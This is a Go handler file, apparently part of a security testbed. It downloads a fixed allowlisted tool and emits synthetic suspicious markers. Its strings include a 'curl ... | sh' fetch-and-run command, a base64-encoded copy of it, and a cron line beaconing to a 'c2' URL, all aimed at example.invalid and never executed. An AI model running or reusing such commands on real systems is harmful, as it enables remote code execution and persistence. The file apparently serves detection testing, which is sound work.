package handlers

import (
	"encoding/base64"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
)

const trustedToolURL = "https://downloads.example.invalid/reach-testbed-tool.bin"

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	if !allowedToolURL(source) {
		http.Error(w, "invalid tool URL", http.StatusBadRequest)
		return
	}

	resp, err := http.Get(trustedToolURL)
	if err != nil {
		writeClientError(w, r, http.StatusBadGateway, "bad gateway", err, "fetch trusted tool")
		return
	}
	defer resp.Body.Close()

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		writeClientError(w, r, http.StatusInternalServerError, "internal error", err, "create fetched tool file")
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
		writeClientError(w, r, http.StatusInternalServerError, "internal error", err, "store fetched tool file")
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}

func allowedToolURL(raw string) bool {
	parsed, err := url.Parse(raw)
	if err != nil {
		return false
	}
	if parsed.Scheme != "https" || parsed.Host != "downloads.example.invalid" || parsed.Path != "/reach-testbed-tool.bin" {
		return false
	}
	return parsed.User == nil && parsed.RawQuery == "" && parsed.Fragment == "" && parsed.Port() == ""
}
